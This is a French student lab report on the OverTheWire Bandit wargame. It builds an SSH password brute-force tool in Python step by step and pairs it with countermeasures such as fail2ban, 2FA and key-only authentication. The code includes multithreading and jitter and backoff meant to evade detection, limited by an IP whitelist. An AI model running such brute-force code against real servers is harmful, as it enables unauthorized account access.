Lab 02 – Initiation à la Sécurité Web avec OverTheWire (Bandit)

Objectif
Ce laboratoire a pour but d'explorer les vulnérabilités liées à l'authentification SSH à travers le wargame Bandit d'OverTheWire. Les exercices portent sur :
•	La connexion SSH et la lecture de mots de passe cachés
•	L'implémentation d'un outil de brute-force SSH en Python
•	L'application de bonnes pratiques de sécurité (fail2ban, 2FA, clés SSH)

Exercice 2 – Connexion SSH basique
Fichier : exercice2.py
Description
Implémentation d'une fonction de connexion SSH utilisant la bibliothèque paramiko. La fonction tente une authentification par identifiant/mot de passe et retourne le résultat.
Code
import paramiko, socket

def try_ssh_login(host, port, username, password, timeout=3.0):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username, password=password,
                       timeout=timeout, allow_agent=False, look_for_keys=False)
        return {"outcome": "success", "host": host, "user": username}
    except paramiko.AuthenticationException:
        return {"outcome": "failure", "host": host, "user": username}
    except (paramiko.SSHException, OSError, socket.error) as e:
        return {"outcome": "error", "host": host, "user": username, "msg": str(e)}
    finally:
        client.close()
Analyse
Aspect	Détail
Bibliothèque	paramiko – bibliothèque Python standard pour SSH
Politique de clés	AutoAddPolicy() – accepte automatiquement les clés inconnues (risque MITM)
Gestion des erreurs	Distingue échec d'auth, erreur réseau/SSH
Vulnérabilité ciblée	Authentification par mot de passe faible
Résultat attendu
{"outcome": "success", "host": "bandit.labs.overthewire.org", "user": "bandit0"}
// ou
{"outcome": "failure", "host": "...", "user": "bandit0"}

Exercice 3 – Capture du bannière SSH
Fichier : exercice3.py
Description
Extension de la fonction de connexion pour capturer la bannière SSH du serveur distant (remote_version), permettant d'identifier la version du serveur SSH.
Code
def try_ssh_login_with_banner(host, port, username, password, timeout=3.0):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    banner = None
    try:
        client.connect(host, port=port, username=username, password=password,
                       timeout=timeout, allow_agent=False, look_for_keys=False)
        outcome = "success"
    except paramiko.AuthenticationException:
        outcome = "failure"
    except (paramiko.SSHException, OSError) as e:
        return {"outcome": "error", "msg": str(e), "banner": None}
    finally:
        transport = client.get_transport()
        if transport:
            banner = transport.remote_version
        client.close()
    return {"outcome": outcome, "banner": banner}
Analyse
Aspect	Détail
Information récupérée	Version OpenSSH du serveur (SSH-2.0-OpenSSH_x.x)
Utilité offensive	Identifier des versions vulnérables (ex. CVE connues)
Utilité défensive	Vérifier que le serveur est à jour
Vulnérabilité identifiée
La bannière SSH divulgue la version exacte du serveur, facilitant le fingerprinting. Un attaquant peut cibler des CVE spécifiques à cette version.
Solution : Masquer ou personnaliser la bannière SSH dans /etc/ssh/sshd_config avec DebianBanner no.

Exercice 4 – Chargement d'une wordlist
Fichier : exercice4.py
Description
Fonction utilitaire pour charger une liste de mots de passe depuis un fichier, en ignorant les lignes vides et les commentaires.
Code
def load_wordlist(path):
    with open(path, encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f]
    return [l for l in lines if l and not l.startswith('#')]
Analyse
Cette fonction supporte des wordlists standard comme rockyou.txt (14M+ mots de passe). Le filtrage des commentaires (#) est compatible avec le format SecLists.

Exercice 5 – Brute-force séquentiel avec contrôle réseau
Fichier : exercice5.py
Description
Implémentation d'un brute-force séquentiel avec un mécanisme de whitelist réseau pour restreindre les cibles autorisées (usage éthique uniquement).
Code
import ipaddress, time

ALLOWED_NETWORKS = [
    ipaddress.ip_network("127.0.0.1/32"),
    ipaddress.ip_network("192.168.56.0/24"),
]

def is_allowed(host):
    addr = ipaddress.ip_address(host)
    return any(addr in net for net in ALLOWED_NETWORKS)

def brute_sequential(host, port, username, wordlist, max_attempts=10):
    if not is_allowed(host):
        raise ValueError(f"Hôte {host} hors périmètre autorisé.")
    for password in wordlist[:max_attempts]:
        result = try_ssh_login(host, port, username, password)
        print(result)
        if result["outcome"] == "success":
            return result
        time.sleep(1)
    return None
Analyse
Aspect	Détail
Whitelist	Restreint l'exécution aux environnements de test
Délai	time.sleep(1) – réduit la détection par systèmes IDS/IPS
Limite	max_attempts=10 – évite les tentatives massives

Exercice 6 – Brute-force avec backoff exponentiel
Fichier : exercice6.py
Description
Amélioration du brute-force avec un mécanisme de backoff : en cas de 3 erreurs consécutives (signe de verrouillage ou rate-limiting), le script attend 30 secondes avant de continuer.
Code
def brute_with_backoff(host, port, username, wordlist, max_attempts=10):
    if not is_allowed(host):
        raise ValueError("Hôte non autorisé.")
    consecutive_errors = 0
    for password in wordlist[:max_attempts]:
        result = try_ssh_login(host, port, username, password)
        if result["outcome"] == "error":
            consecutive_errors += 1
            if consecutive_errors >= 3:
                print("3 erreurs consécutives — verrouillage probable, attente 30s.")
                time.sleep(30)
                consecutive_errors = 0
            else:
                time.sleep(2)
        else:
            consecutive_errors = 0
            if result["outcome"] == "success":
                return result
        time.sleep(1)
    return None
Analyse
Le backoff permet de contourner partiellement des mécanismes de rate-limiting basiques, mais reste détectable par des outils comme fail2ban configuré avec une fenêtre temporelle large.

Exercice 7 – Jitter aléatoire
Fichier : exercice7.py
Description
Ajout d'un délai aléatoire (jitter) entre les tentatives pour imiter un comportement humain et éviter la détection par signature temporelle.
Code
import random

def sleep_with_jitter(min_s, max_s):
    time.sleep(random.uniform(min_s, max_s))
Analyse
Le jitter rend le comportement du script moins mécanique et plus difficile à détecter via une analyse de fréquence. Cependant :
•	Il ne contourne pas la 2FA
•	Il ne contourne pas l'authentification par clé SSH uniquement
•	fail2ban peut toujours détecter les tentatives sur une fenêtre plus large

Exercice 8 – Brute-force multithread
Fichier : exercice8.py
Description
Implémentation d'un brute-force parallèle avec gestion de threads, file d'attente partagée et mécanisme d'arrêt sur succès.
Code
import threading, queue

def worker(host, port, username, q, stop_event, lock, max_per_thread=3):
    attempts = 0
    while not stop_event.is_set() and attempts < max_per_thread:
        try:
            password = q.get(timeout=1)
        except queue.Empty:
            break
        result = try_ssh_login(host, port, username, password)
        with lock:
            print(result)
        if result["outcome"] == "success":
            stop_event.set()
        q.task_done()
        attempts += 1
Analyse
Aspect	Détail
Parallélisme	Plusieurs threads testent des mots de passe simultanément
Stop event	Arrêt propre de tous les threads dès un succès
Lock	Évite les race conditions lors de l'affichage
Risque	Beaucoup plus visible pour les IDS – génère un burst de connexions

Exercice 11 – Protections contre le brute-force
Fichier : exercice11.txt
3 Protections essentielles
1. fail2ban
Mécanisme : Surveille /var/log/auth.log et bloque automatiquement une IP après plusieurs échecs d'authentification.
# Installation
sudo apt install fail2ban

# Configuration /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 5
bantime = 3600
findtime = 600
Efficacité : Bloque les brute-forces séquentiels et multithreads à haut débit. Moins efficace contre les attaques lentes avec jitter.
2. Authentification à deux facteurs (2FA)
Mécanisme : Exige un second facteur (TOTP, clé physique) en plus du mot de passe.
Efficacité : Rend le brute-force totalement inutile – même si le mot de passe est trouvé, l'attaquant ne peut pas se connecter sans le second facteur.
# Avec Google Authenticator
sudo apt install libpam-google-authenticator
3. Désactivation de l'authentification par mot de passe
Mécanisme : Force l'utilisation de clés SSH uniquement.
# /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes
Efficacité : Élimine complètement la surface d'attaque du brute-force par mot de passe – aucun mot de passe à deviner.
Effet du Jitter sur les protections
Protection	Jitter contourne ?
fail2ban (fenêtre courte)	✅ Partiellement
fail2ban (fenêtre large)	❌ Non
2FA	❌ Non
Auth par clé SSH uniquement	❌ Non

Log d'exécution
Fichier : brute_scan.log
2026-04-26 20:17:30,726 - Tentative : ********23
Log horodaté d'une tentative de connexion (mot de passe masqué pour la sécurité).

Vulnérabilités identifiées & Contre-mesures
#	Vulnérabilité	Niveau de risque	Contre-mesure
1	Mot de passe faible / dictionnaire	🔴 Critique	Politique de mots de passe forts + 2FA
2	Authentification par mot de passe activée	🔴 Critique	Désactiver PasswordAuthentication
3	Bannière SSH divulgue la version	🟡 Moyen	DebianBanner no dans sshd_config
4	Absence de limitation de tentatives	🔴 Critique	fail2ban avec règles strictes
5	Pas de monitoring des connexions	🟠 Élevé	SIEM, alertes sur échecs répétés
6	AutoAddPolicy (pas de vérification de clé)	🟡 Moyen	Vérifier les fingerprints de clé

Conclusion
Ce laboratoire démontre comment un attaquant peut mettre en œuvre une attaque par brute-force SSH en plusieurs étapes (connexion simple → avec bannière → séquentiel → avec backoff → multithread), tout en appliquant des techniques d'évasion (jitter, backoff).
Les contre-mesures les plus efficaces restent, par ordre d'efficacité :
1.	Désactiver complètement l'auth par mot de passe (clés SSH uniquement)
2.	Activer la 2FA
3.	Déployer fail2ban avec une configuration adaptée
La combinaison de ces trois mesures rend le brute-force SSH pratiquement impossible.

Technologies utilisées
•	Python 3.11
•	paramiko – SSH client library
•	threading, queue – parallélisme
•	ipaddress – validation réseau
•	OverTheWire Bandit – environnement de test

